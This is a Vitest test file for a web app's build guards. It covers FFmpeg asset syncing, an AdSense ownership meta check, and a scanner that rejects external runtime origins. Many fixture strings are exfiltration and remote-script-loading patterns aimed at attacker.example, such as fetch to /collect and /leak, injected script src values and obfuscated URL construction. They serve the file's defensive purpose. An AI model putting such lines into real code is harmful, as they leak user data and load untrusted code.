import { afterEach, expect, test } from 'vitest'
import { copyFile, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { runtimeAssetUrl } from './runtimeAssets'
import { assertExactRuntimeAssets, syncRuntimeAssets } from '../../scripts/sync-runtime-assets.mjs'
import { assertPassiveAdsenseOwnershipMeta } from '../../scripts/assert-ownership-meta.mjs'
import { assertBuiltRuntimeArtifacts, assertNoExternalRuntimeOrigins } from '../../scripts/assert-runtime-artifacts.mjs'

const temporaryDirectories = []

async function createTemporaryDirectory() {
  const directory = await mkdtemp(join(tmpdir(), 'folkkit-runtime-assets-'))
  temporaryDirectories.push(directory)
  return directory
}

afterEach(async () => {
  await Promise.all(temporaryDirectories.splice(0).map((directory) => rm(directory, { recursive: true, force: true })))
})

test('resolves FFmpeg assets below the application base URL', () => {
  expect(runtimeAssetUrl('vendor/ffmpeg/ffmpeg-core.wasm')).toBe('/vendor/ffmpeg/ffmpeg-core.wasm')
})

test('copies the pinned FFmpeg core JavaScript and WASM files to the public runtime directory', async () => {
  const sourceDirectory = await createTemporaryDirectory()
  const destinationDirectory = await createTemporaryDirectory()
  await writeFile(join(sourceDirectory, 'ffmpeg-core.js'), 'ffmpeg core JavaScript')
  await writeFile(join(sourceDirectory, 'ffmpeg-core.wasm'), 'ffmpeg core WASM')

  await syncRuntimeAssets({ sourceDirectory, destinationDirectory })

  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.js'), 'utf8')).resolves.toBe('ffmpeg core JavaScript')
  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.wasm'), 'utf8')).resolves.toBe('ffmpeg core WASM')
})

test('removes the non-URL FFmpeg address placeholder instead of weakening the external literal gate', async () => {
  const sourceDirectory = await createTemporaryDirectory()
  const destinationDirectory = await createTemporaryDirectory()
  await writeFile(join(sourceDirectory, 'ffmpeg-core.js'), 'diagnostic: //address:port')
  await writeFile(join(sourceDirectory, 'ffmpeg-core.wasm'), 'core WASM')

  await syncRuntimeAssets({ sourceDirectory, destinationDirectory })

  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.js'), 'utf8')).resolves.toBe('diagnostic: address:port')
})

test('keeps an existing runtime directory unchanged when a required FFmpeg core file is absent', async () => {
  const sourceDirectory = await createTemporaryDirectory()
  const destinationDirectory = await createTemporaryDirectory()
  await writeFile(join(sourceDirectory, 'ffmpeg-core.js'), 'ffmpeg core JavaScript')
  await writeFile(join(destinationDirectory, 'ffmpeg-core.js'), 'previous JavaScript')
  await writeFile(join(destinationDirectory, 'ffmpeg-core.wasm'), 'previous WASM')

  await expect(syncRuntimeAssets({ sourceDirectory, destinationDirectory })).rejects.toThrow('ffmpeg-core.wasm')
  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.js'), 'utf8')).resolves.toBe('previous JavaScript')
  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.wasm'), 'utf8')).resolves.toBe('previous WASM')
})

test('keeps an existing runtime directory unchanged when staging a core asset fails', async () => {
  const sourceDirectory = await createTemporaryDirectory()
  const destinationDirectory = await createTemporaryDirectory()
  await writeFile(join(sourceDirectory, 'ffmpeg-core.js'), 'new JavaScript')
  await writeFile(join(sourceDirectory, 'ffmpeg-core.wasm'), 'new WASM')
  await writeFile(join(destinationDirectory, 'ffmpeg-core.js'), 'previous JavaScript')
  await writeFile(join(destinationDirectory, 'ffmpeg-core.wasm'), 'previous WASM')

  await expect(syncRuntimeAssets({
    sourceDirectory,
    destinationDirectory,
    copyFile: async (sourcePath, destinationPath) => {
      if (sourcePath.endsWith('ffmpeg-core.wasm')) throw new Error('copy failed')
      await copyFile(sourcePath, destinationPath)
    },
  })).rejects.toThrow('copy failed')

  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.js'), 'utf8')).resolves.toBe('previous JavaScript')
  await expect(readFile(join(destinationDirectory, 'ffmpeg-core.wasm'), 'utf8')).resolves.toBe('previous WASM')
})

test('rejects any file outside the exact FFmpeg runtime vendor allowlist', async () => {
  const vendorDirectory = await createTemporaryDirectory()
  await mkdir(join(vendorDirectory, 'ffmpeg'), { recursive: true })
  await writeFile(join(vendorDirectory, 'ffmpeg', 'ffmpeg-core.js'), 'core JavaScript')
  await writeFile(join(vendorDirectory, 'ffmpeg', 'ffmpeg-core.wasm'), 'core WASM')
  await writeFile(join(vendorDirectory, 'unexpected.js'), 'unexpected')

  await expect(assertExactRuntimeAssets({ vendorDirectory })).rejects.toThrow(/unexpected runtime vendor file.*unexpected\.js/i)
})

test('accepts one passive AdSense ownership meta tag regardless of attribute order or quote style', () => {
  expect(() => assertPassiveAdsenseOwnershipMeta("<meta content='ca-pub-7877827162675091' data-build='folkkit' name='google-adsense-account'>")).not.toThrow()
})

test('rejects built HTML without exactly one passive AdSense ownership meta tag', () => {
  const ownershipMeta = '<meta name="google-adsense-account" content="ca-pub-7877827162675091">'

  expect(() => assertPassiveAdsenseOwnershipMeta('<head></head>')).toThrow('exactly one')
  expect(() => assertPassiveAdsenseOwnershipMeta(`${ownershipMeta}${ownershipMeta}`)).toThrow('exactly one')
  expect(() => assertPassiveAdsenseOwnershipMeta(`${ownershipMeta}<meta content="ca-pub-other" name="google-adsense-account">`)).toThrow('exactly one')
  expect(() => assertPassiveAdsenseOwnershipMeta('<meta name="google-adsense-account" content="ca-pub-other">')).toThrow('ca-pub-7877827162675091')
})

test('rejects AdSense runtime markers in built HTML', () => {
  const ownershipMeta = '<meta name="google-adsense-account" content="ca-pub-7877827162675091">'

  expect(() => assertPassiveAdsenseOwnershipMeta(`${ownershipMeta}<script>window.adsbygoogle = []</script>`)).toThrow('runtime marker')
  expect(() => assertPassiveAdsenseOwnershipMeta(`${ownershipMeta}<script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>`)).toThrow('runtime marker')
})

test('rejects external origins in a generated service-worker runtime artifact', () => {
  expect(() => assertNoExternalRuntimeOrigins('sw.js', "fetch('https://fonts.googleapis.com/css2?family=Gothic+A1')")).toThrow('external runtime origin')
  expect(() => assertNoExternalRuntimeOrigins('sw.js', "fetch('/assets/app.js')")).not.toThrow()
})

test.each([
  ['app.js', "fetch('https://attacker.example/collect')"],
  ['chunk.mjs', "import('https://attacker.example/module.js')"],
  ['worker.js', "new Worker('https://attacker.example/worker.js')"],
  ['index.html', '<script src="https://attacker.example/app.js"></script>'],
  ['index.html', '<link rel="stylesheet" href="https://attacker.example/app.css">'],
  ['app.css', 'body { background-image: url(https://attacker.example/pixel.png); }'],
  ['icon.svg', '<svg><image href="https://attacker.example/pixel.png" /></svg>'],
  ['manifest.json', '{"start_url":"https://attacker.example/","icons":[{"src":"https://attacker.example/icon.png"}]}'],
])('rejects an arbitrary external automatic runtime sink in %s', (artifactName, contents) => {
  expect(() => assertNoExternalRuntimeOrigins(artifactName, contents)).toThrow(/external runtime origin/i)
})

test('allows fixed legal source navigation that does not load a runtime resource', () => {
  expect(() => assertNoExternalRuntimeOrigins(
    'index.html',
    '<a href="https://github.com/ThisIsPhantom/folkkit">Source code</a>',
  )).not.toThrow()
})

test('rejects external converter output literals and DOM runtime source assignments', () => {
  expect(() => assertNoExternalRuntimeOrigins(
    'utility.js',
    'const output = `<img src="https://placehold.co/400x300">`; const css = `url(https://placehold.co/400x300)`;',
  )).toThrow(/external runtime origin/i)
  expect(() => assertNoExternalRuntimeOrigins(
    'app.js',
    'const script = document.createElement("script"); script.src = "https://attacker.example/app.js";',
  )).toThrow(/external runtime origin/i)
})

test.each([
  ['const endpoint = "https://attacker.example/collect"; fetch(endpoint)'],
  ['const endpoint = "https:" + "//attacker.example/collect"; fetch(endpoint)'],
  ['const host = "attacker.example"; fetch(`https://${host}/collect`)'],
  ['fetch(new URL("https://attacker.example/collect"))'],
  ['new Worker(new URL("https://attacker.example/worker.js"))'],
  ['const endpoint = "https://attacker.example/app.js"; element.setAttribute("src", endpoint)'],
  ['const endpoint = "//attacker.example/app.js"; element.setAttribute("href", endpoint)'],
])('rejects indirect external JavaScript runtime sink: %s', (contents) => {
  expect(() => assertNoExternalRuntimeOrigins('app.js', contents)).toThrow(/external runtime origin/i)
})

test('allows only exact reviewed external legal navigation values', () => {
  expect(() => assertNoExternalRuntimeOrigins(
    'app.js',
    'jsx("a", { href: "https://github.com/ThisIsPhantom/folkkit/tree/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" })',
  )).not.toThrow()
  expect(() => assertNoExternalRuntimeOrigins(
    'app.js',
    'jsx("a", { href: "https://github.com/ThisIsPhantom/folkkit-malicious" })',
  )).toThrow(/external runtime origin/i)
})

test('rejects unquoted external HTML navigation outside the exact reviewed allowlist', () => {
  expect(() => assertNoExternalRuntimeOrigins('index.html', '<a href=https://attacker.example>leave</a>')).toThrow(/external runtime origin/i)
  expect(() => assertNoExternalRuntimeOrigins('index.html', '<a href="https://www.gnu.org/licenses/agpl-3.0.html">AGPL</a>')).not.toThrow()
})

test.each([
  ['app.js', 'new URL("/collect", "https://attacker.example")'],
  ['app.js', 'new URL("/issues", "https://github.com/react/react")'],
  ['app.js', 'window.open("https://attacker.example/leave", "_blank")'],
  ['index.html', '<a href=https://github.com/facebook/react>not reviewed here</a>'],
  ['index.html', '<a href="https://www.gnu.org/licenses/agpl-3.0.html" href="https://attacker.example">duplicate</a>'],
  ['index.html', '<script src=https://attacker.example/app.js></script>'],
])('rejects reviewer literal PoC in %s', (artifactName, contents) => {
  expect(() => assertNoExternalRuntimeOrigins(artifactName, contents)).toThrow(/external runtime origin/i)
})

test.each([
  ['index.html', "<script title='>' src='https://attacker.example/app.js'></script>"],
  ['index.html', '<img srcset="https://attacker.example/a.png 1x, /local.png 2x">'],
  ['index.html', '<a href="https://www.gnu.org/licenses/agpl-3.0.html" href="https://www.gnu.org/licenses/agpl-3.0.html">duplicate</a>'],
  ['index.html', '<meta http-equiv="refresh" content="0; url=https://attacker.example/leave">'],
  ['index.html', '<p>https://attacker.example/plain-text</p>'],
  ['app.css', '.hero { background-image: image-set("https://attacker.example/a.png" 1x, "/b.png" 2x); }'],
  ['app.css', '.hero { background: image-set("https://github.com/react/react" 1x); }'],
])('rejects fail-closed HTML or CSS reviewer PoC in %s', (artifactName, contents) => {
  expect(() => assertNoExternalRuntimeOrigins(artifactName, contents)).toThrow(/external runtime origin/i)
})

test('allows quote-aware local HTML attributes, local CSS URLs and exact reviewed anchor navigation', () => {
  expect(() => assertNoExternalRuntimeOrigins(
    'index.html',
    "<script title='>' src='/app.js'></script><img srcset='/a.png 1x, /b.png 2x'><meta http-equiv='refresh' content='0; url=/local'><a href='https://www.gnu.org/licenses/agpl-3.0.html'>AGPL</a>",
  )).not.toThrow()
  expect(() => assertNoExternalRuntimeOrigins(
    'app.css',
    '.hero { background-image: image-set(url("/a.png") 1x, "/b.png" 2x); }',
  )).not.toThrow()
})

test('allows a reviewed SVG namespace but rejects the same reviewed URL in an SVG runtime href', () => {
  expect(() => assertNoExternalRuntimeOrigins(
    'favicon.svg',
    '<svg xmlns="http://www.w3.org/2000/svg"><image href="/local.png" /></svg>',
  )).not.toThrow()
  expect(() => assertNoExternalRuntimeOrigins(
    'favicon.svg',
    '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://github.com/react/react" /></svg>',
  )).toThrow(/external runtime origin/i)
})

test('scans SVG, manifest JSON, MJS and nested worker artifacts in the final build tree', async () => {
  const distDirectory = await createTemporaryDirectory()
  await mkdir(join(distDirectory, 'nested'), { recursive: true })
  await writeFile(join(distDirectory, 'nested', 'worker.mjs'), "fetch('https://attacker.example/leak')")
  await writeFile(join(distDirectory, 'manifest.json'), '{"start_url":"/"}')
  await writeFile(join(distDirectory, 'icon.svg'), '<svg />')

  await expect(assertBuiltRuntimeArtifacts({ distDirectory })).rejects.toThrow(/external runtime origin/i)
})

test('rejects the test-only old service worker from built runtime artifacts', async () => {
  const distDirectory = await createTemporaryDirectory()
  await writeFile(join(distDirectory, 'old-sw.js'), "caches.open('folkkit-app-test-old')")

  await expect(assertBuiltRuntimeArtifacts({ distDirectory })).rejects.toThrow('test-only service worker')
})

test('rejects a built CSS artifact that imports Google Fonts', async () => {
  const distDirectory = await createTemporaryDirectory()
  await writeFile(join(distDirectory, 'app.css'), "@import url('https://fonts.googleapis.com/css2?family=Gothic+A1');")

  await expect(assertBuiltRuntimeArtifacts({ distDirectory })).rejects.toThrow('external runtime origin')
})

test('rejects a built CSS artifact that loads a Google font URL', async () => {
  const distDirectory = await createTemporaryDirectory()
  await writeFile(join(distDirectory, 'app.css'), "@font-face { src: url('https://fonts.gstatic.com/s/folkkit.woff2'); }")

  await expect(assertBuiltRuntimeArtifacts({ distDirectory })).rejects.toThrow('external runtime origin')
})
